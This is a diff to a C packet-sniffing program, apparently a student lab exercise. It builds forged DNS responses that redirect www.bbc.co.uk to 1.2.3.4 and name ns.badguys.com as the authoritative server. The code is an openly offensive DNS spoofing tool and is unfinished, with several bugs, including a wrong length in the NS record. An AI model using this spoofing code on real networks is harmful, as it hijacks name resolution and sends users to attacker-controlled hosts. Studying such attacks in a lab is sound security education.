@@ -12,7 +12,13 @@
 
 
 #define BUFSIZE 1500;
+
 void spoof_DNS_reply(struct ipheader* ip);
+unsigned short construct_dns_reply(char *buffer);
+unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr);
+unsigned short set_NS_record(char *buffer, char *name, char offset, char *name_server);
+
+
 
 void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
@@ -35,7 +41,7 @@ int main()
   bpf_u_int32 net; 
 
   //Open live pcap session on NIC with name eth0
-  handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);	  
+  handle = pcap_open_live("eth14", BUFSIZ, 1, 1000, errbuf);	  
   printf("handle is %p\n",handle);
   printf("errbuf is %s\n",errbuf);
   
@@ -51,7 +57,7 @@ int main()
 void spoof_DNS_reply(struct ipheader* ip)
 {
     int ip_header_len = ip->iph_ihl * 4;
-    const char buffer[1500];
+    char buffer[1500]; //removed const as a lazy fix to compiling error
 
     struct udpheader* udp = (struct udpheader *) ((u_char *)ip + ip_header_len);
 
@@ -62,7 +68,7 @@ void spoof_DNS_reply(struct ipheader* ip)
     struct udpheader * newudp = (struct udpheader *) 
                                   ((u_char *)buffer + ip_header_len);
 
-    // Construct IP: swap src and dest in faked ICMP packet
+    // Construct IP: swap src and dest in faked DNS packet
     newip->iph_sourceip = ip->iph_destip;
     newip->iph_destip = ip->iph_sourceip;
     newip->iph_ttl = 20;
@@ -70,7 +76,7 @@ void spoof_DNS_reply(struct ipheader* ip)
 
     
 
-    //Calculate the checksum for integrity. ICMP checksum includes the data 
+    //Calculate the checksum for integrity. UDP checksum includes the data 
     newudp->udp_sum = 0; // Set it to zero first
     newudp->udp_sum = in_cksum((unsigned short *)newudp, ntohs(ip->iph_len) - ip_header_len);
     newudp->udp_sport = udp->udp_dport;
@@ -79,7 +85,7 @@ void spoof_DNS_reply(struct ipheader* ip)
     //DNS bit here
     int udp_header_len = ip->iph_ihl * 4;
     struct dnsheader* dns = (struct dnsheader *) ((u_char *)udp + udp_header_len);
-    unsigned short dnsLength = construct_dns_reply(dns);
+    unsigned short dnsLength = construct_dns_reply(buffer);
 
     send_raw_ip_packet(newip);
 }
@@ -92,14 +98,15 @@ void spoof_DNS_reply(struct ipheader* ip)
 }*/
 
 /*Construct DNS Header and Records. Return the size (Header + Records)*/
-unsigned short construct_dns_reply(dnsheader *dns)
+unsigned short construct_dns_reply(char *buffer)
 {
 	char TARGET_DOMAIN[] = "www.bbc.co.uk";
 	char ANSWER_IPADDR[] = "1.2.3.4";
 	char NS_SERVER[] = "ns.badguys.com";
-	char NS_IPADDR = "1.2.3.5";
+	char NS_IPADDR[] = "1.2.3.5";
 
-	//struct dnsheader *dns = (struct dnsheader *) buffer;
+
+	struct dnsheader *dns = (struct dnsheader *) buffer;
 
 	//construct the DNS header:
 	dns->flags=htons(0x8400); //Flag = response; this is a DNS response
@@ -128,7 +135,7 @@ unsigned short construct_dns_reply(dnsheader *dns)
 /*Construct an "A" record, and return the total size of the record.
 If name is NULL, use the offset parameter to construct the "name" field.
 If name is not NULL, copy it to the "name" field, and ignore the offset parameter.*/
-/*unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr)
+unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr)
 {
 	char *p = buffer;
 
@@ -146,14 +153,63 @@ If name is not NULL, copy it to the "name" field, and ignore the offset paramete
 	p += 2;
 
 	*((unsigned short *)p ) = htons(0x0001);	//Class
+	p += 2;
 
 	*((unsigned int *)p ) = htonl(0x00002000);	//Time to Live
+	p += 4;
 
-	*(unsigned short *)p ) = htons(0x0004);		//Data Length
+	*((unsigned short *)p ) = htons(0x0004);	//Data Length (always 4. 1 byte per ip addr section)
+	p += 2;
 
 	((struct in_addr *)p)->s_addr = inet_addr(ip_addr); //IP address
 	p += 4;
 
 	return (p-buffer);
 
-}*/
+}
+
+/*Construct an NS section to DNS response payload. (Authority section)*/
+/*NOTE: Not sure about what to do if name==NULL. Taken from set_A_record*/
+unsigned short set_NS_record(char *buffer, char *name, char offset, char *name_server)
+{
+	char *p = buffer;
+
+	if(name == NULL){
+		*p = 0xC0;
+		p++;
+		*p = offset;
+		p++;
+	} else {
+		strcpy(p, name);
+		p += strlen(name) + 1;
+	}
+
+	*((unsigned short *)p ) = htons(0x0002);	//Record Type
+	p += 2;
+
+	*((unsigned short *)p ) = htons(0x0001);	//Class
+	p += 2;
+
+	*((unsigned int *)p ) = htonl(0x00002000);	//Time to Live
+	p += 4;
+
+	*((unsigned short *)p ) = htons(0x000C);		//Data Length (fix to make dynamic for size of )
+	p += 2;
+
+//	((struct in_addr *)p)->s_addr = inet_addr(ip_addr); //IP address
+
+
+	//Name Server (need to update)
+	if(name_server == NULL){
+		*p = 0xC0;
+		p++;
+		*p = offset;
+		p++;
+	} else {
+		strcpy(p, name_server);
+		p += strlen(name) + 1;
+	}
+
+	return (p-buffer);
+
+}
